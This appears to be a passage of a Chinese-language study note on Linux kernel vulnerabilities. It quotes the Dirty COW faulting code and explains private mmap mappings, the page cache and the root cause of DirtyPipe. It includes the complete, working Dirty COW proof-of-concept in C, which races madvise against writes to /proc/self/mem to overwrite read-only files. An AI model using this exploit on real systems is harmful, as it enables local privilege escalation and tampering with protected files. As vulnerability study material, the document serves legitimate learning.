		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> address<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>flags<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>nonblocking<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> vma<span class="token operator">-&gt;</span>vm_mm<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> fault_flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> ret<span class="token punctuation">;</span>

	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> VM_FAULT_WRITE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>vma<span class="token operator">-&gt;</span>vm_flags <span class="token operator">&amp;</span> VM_WRITE<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token operator">*</span>flags <span class="token operator">&amp;=</span> <span class="token operator">~</span>FOLL_WRITE<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>漏洞代码就是</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> VM_FAULT_WRITE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>vma<span class="token operator">-&gt;</span>vm_flags <span class="token operator">&amp;</span> VM_WRITE<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token operator">*</span>flags <span class="token operator">&amp;=</span> <span class="token operator">~</span>FOLL_WRITE<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>如果当前VMA中的标志显示当前页不可写，但是用户又执行了页的写操作，那么内核会执行COW操作 并且在处理中会有VM_FAULT_WRITE标志 也就是执行cow操作后,会益处FOLL_WRITE标志</p></li></ul></li></ul><h3 id="poc" tabindex="-1"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> POC</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token operator">*</span>map<span class="token punctuation">;</span>
<span class="token keyword">int</span> f<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">madviseThread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>
  str<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">100000000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    c<span class="token operator">+=</span><span class="token function">madvise</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>MADV_DONTNEED<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;madvise %d\\n\\n&quot;</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">procselfmemThread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>
  str<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>
  <span class="token keyword">int</span> f<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/proc/self/mem&quot;</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">100000000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">lseek</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span>map<span class="token punctuation">,</span><span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    c<span class="token operator">+=</span><span class="token function">write</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span>str<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;procselfmem %d\\n\\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token class-name">pthread_t</span> pth1<span class="token punctuation">,</span>pth2<span class="token punctuation">;</span>
  f<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fstat</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token operator">&amp;</span>st<span class="token punctuation">)</span><span class="token punctuation">;</span>
  name<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  map<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>st_size<span class="token punctuation">,</span>PROT_READ<span class="token punctuation">,</span>MAP_PRIVATE<span class="token punctuation">,</span>f<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;mmap %x\\n\\n&quot;</span><span class="token punctuation">,</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pth1<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>madviseThread<span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pth2<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>procselfmemThread<span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pthread_join</span><span class="token punctuation">(</span>pth1<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pthread_join</span><span class="token punctuation">(</span>pth2<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="mmap私有映射文件" tabindex="-1"><a class="header-anchor" href="#mmap私有映射文件" aria-hidden="true">#</a> mmap私有映射文件</h3><blockquote><p>学习文章:https://segmentfault.com/a/1190000044229036</p><p>其实是在分析dirty cow的时候对内存文件页面的映射不是特别清楚,所以单独研究一下mmap私有映射文件</p></blockquote><p>堆和栈之间,其实就是mmap进行从操作的区域,mmap出来一般就是vm_area_struct(<strong>VMA</strong>)结构来表示</p><p>进程虚拟内存空间中的<strong>VMA</strong>有两种组织形式(同时存在):</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">// 进程虚拟内存空间描述符</span>
<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token punctuation">{</span>
    <span class="token comment">// 串联组织进程空间中所有的 VMA  的双向链表 </span>
    <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span>mmap<span class="token punctuation">;</span>  <span class="token comment">/* list of VMAs */</span>
    <span class="token comment">// 管理进程空间中所有 VMA 的红黑树</span>
    <span class="token keyword">struct</span> <span class="token class-name">rb_root</span> mm_rb<span class="token punctuation">;</span>
  	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token comment">// 虚拟内存区域描述符</span>
<span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token punctuation">{</span>
    <span class="token comment">// vma 在 mm_struct-&gt;mmap 双向链表中的前驱节点和后继节点</span>
    <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span>vm_next<span class="token punctuation">,</span> <span class="token operator">*</span>vm_prev<span class="token punctuation">;</span>
    <span class="token comment">// vma 在 mm_struct-&gt;mm_rb 红黑树中的节点</span>
    <span class="token keyword">struct</span> <span class="token class-name">rb_node</span> vm_rb<span class="token punctuation">;</span>
  	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>双向链表</strong></li><li><strong>红黑树</strong></li></ul><p>根据 mmap 创建出的这片虚拟内存区域背后所映射的<strong>物理内存</strong>能否在多进程之间共享,细分两种映射方式</p><ul><li><p><code>MAP_SHARED </code>表示共享映射，通过 mmap 映射出的这片内存区域在多进程之间是共享的，一个进程修改了共享映射的内存区域，其他进程是可以看到的，用于多进程之间的通信。</p></li><li><p><code>MAP_PRIVATE </code>表示私有映射，通过 mmap 映射出的这片内存区域是进程私有的，其他进程是看不到的。如果是私有文件映射，那么多进程针对同一映射文件的修改将不会回写到磁盘文件上</p><p>这个就很符合开发思路,比如同一份二进制程序执行多个进程,代码段对于多进程来说是只读的所以就共享一块内存,然后data段等每个进程都是独立的,写的时候在单独进行修改.并且不会写回原本的二进制程序.所以在这个flags被用于<strong>load_aout_binary</strong>也就是加载可执行程序</p></li></ul><p>那么我们可以通过mmap私有映射文件,携带flags:<code>MAP_PRIVATE</code></p><ul><li>先打开文件,创建vm_area_struct存储file指针 然后创建file结构体来描述打开的文件</li><li>用<code>fd_array</code>找一个空闲位置分配,下标就是文件描述符</li><li>读取内容的时候,内核会将文件变成多个缓冲页面存放在内存中(<strong>page cache</strong>) inode结构会存储指向<strong>page_cache</strong>的指针,也就是struct address_space <strong>i_mapping</strong>, 每个<strong>page_cache</strong>会存储文件所有的缓存页面</li><li>当第一次读取的时候会触发缺页异常,创建文件内存页面对应的pte,与page cache关联起来</li><li>当要写入的时候,因为是私有映射所以pte应该是只读的,会产生一个写保护类型的缺页中断,然后会重新申请一个内存页面,将page cache里面拷贝过去然后改成可写</li></ul><h2 id="dirtypipe漏洞成因" tabindex="-1"><a class="header-anchor" href="#dirtypipe漏洞成因" aria-hidden="true">#</a> DirtyPipe漏洞成因</h2><blockquote><p>参考文章:https://blog.csdn.net/void_zk/article/details/125884637</p></blockquote><ul><li>没有初始化pip_buffer-&gt;flags属性</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token punctuation">{</span>
	<span class="token comment">// pipe_buffer所占的内存页</span>
	<span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>
	<span class="token comment">// 进程正在读取的数据在page中的偏移量</span>
	<span class="token comment">// len表示内存页拥有的未读数据的长度</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> private<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也就是当我们调用<code>slice</code>函数的时候,会利用管道当作缓冲区。比如A文件内容移动到B文件,那么我们就会调用slice将A的数据转移到管道,然后从管道将数据发送给B。</p><p>那么当文件读取到管道会调用<code>splice_file_to_pipe</code>本质调用的就是<code>copy_page_to_iter_pipe</code>函数,然后这个函数会将pipe_buffer-&gt;page设置为<code>文件映射的页面</code>对应的page(page引用+1)head也会加1</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>buf<span class="token operator">-&gt;</span>ops <span class="token operator">=</span> <span class="token operator">&amp;</span>page_cache_pipe_buf_ops<span class="token punctuation">;</span>
<span class="token comment">// 引用+1</span>
<span class="token function">get_page</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 设置文件内存页面直接为page 省去反复copy的过程</span>
buf<span class="token operator">-&gt;</span>page <span class="token operator">=</span> page<span class="token punctuation">;</span>
<span class="token comment">// 设置偏移</span>
buf<span class="token operator">-&gt;</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>
<span class="token comment">// 设置总字节数</span>
buf<span class="token operator">-&gt;</span>len <span class="token operator">=</span> bytes<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>我们可以发现这里是没有重新设置flags的也就是我们在pipe_write中设置的<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志,携带标志我们可以在pipwrite的时候往文件映射的内存页中写入数据</li></ul>`,93),o=[t];function c(l,i){return s(),a("div",null,o)}const d=n(p,[["render",c],["__file","linux_kernel2.html.vue"]]);export{d as default};
